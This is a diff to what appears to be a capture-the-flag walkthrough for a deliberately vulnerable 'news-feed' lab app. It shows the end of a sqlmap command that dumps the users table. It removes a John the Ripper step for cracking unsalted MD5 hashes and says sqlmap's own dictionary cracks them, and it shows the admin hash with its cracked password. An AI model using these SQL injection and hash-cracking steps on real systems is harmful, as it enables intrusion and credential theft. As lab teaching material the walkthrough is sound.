@@ -165,16 +165,7 @@ sqlmap -u "http://192.168.56.10:5001/news/edit/1" \
        -T users --dump
 ```
 
-### 2c. Crack the hashes
-
-The dump yields unsalted **MD5** hashes ([schema.sql](../challenges/news-feed/schema.sql)) — the app hashes with bare `md5()` at [app.py:38](../challenges/news-feed/app.py#L38). Most are trivial (they're common passwords; several resolve from a plain MD5 lookup):
-
-```bash
-# hashes.txt = one "user:md5" per line, or just the raw hashes
-john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-```
-
-The one that matters is **`admin`**:
+The `users` table hashes are unsalted **MD5** (the app hashes with bare `md5()` at [app.py:38](../challenges/news-feed/app.py#L38)). sqlmap recognises the hash format and offers to crack it with its built-in dictionary — accept the prompt and the common passwords fall instantly, no separate John/hashcat step needed. The one that matters is **`admin`**:
 
 ```
 2251770cd912f585f675d34532c8a1f5  ->  *M0nK3y*
